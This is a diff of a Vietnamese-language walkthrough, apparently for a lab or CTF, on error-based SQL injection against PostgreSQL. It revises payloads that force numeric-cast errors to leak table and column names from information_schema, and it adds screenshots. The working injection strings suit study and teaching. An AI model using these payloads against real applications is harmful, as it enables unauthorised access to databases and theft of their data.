@@ -76,11 +76,19 @@ Những payload hay tên của table mình có tham khảo ở mục số (2) v�
 
 Bây giờ ta sẽ chèn payload như sau
 
-`,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset0)||chr(126)+as+nUmeRiC)--`
+`,cast(chr(126)||(select+table_name+from+information_schema.tables+limit+1,1)||chr(126)+as+numeric)--`
+
+![image](https://user-images.githubusercontent.com/115911041/234294290-692d4acd-8d04-40dd-a01e-c6931c26ef59.png)
 
 Nó gợi ý mình sài LIMIT kèm với OFFSET mới được.Mình sẽ thử `limit 1 offset 0`
 
-`,cast(chr(126)||(select table_name from information_schema.tables limit 1 offset 0)||chr(126))+as+numeric)--`
+`,cast(chr(126)||((select+table_name+from information_schema.tables+limit+1+offset+0)||chr(126))+as+numeric)--`
+
+![image](https://user-images.githubusercontent.com/115911041/234301011-642de513-135b-4063-9aba-255799657659.png)
+
+Bây giờ ta sẽ khai thác tên cột bằng cách chèn payload
+
+`,cast(chr(126)||((select+column_name+from+information_schema.columns+limit+1+offset+0)||chr(126))+as+numeric)--`
 
 ![image](https://user-images.githubusercontent.com/115911041/234286649-cc9bba23-05fa-4f0c-a07e-dbc78ecb4760.png)
 
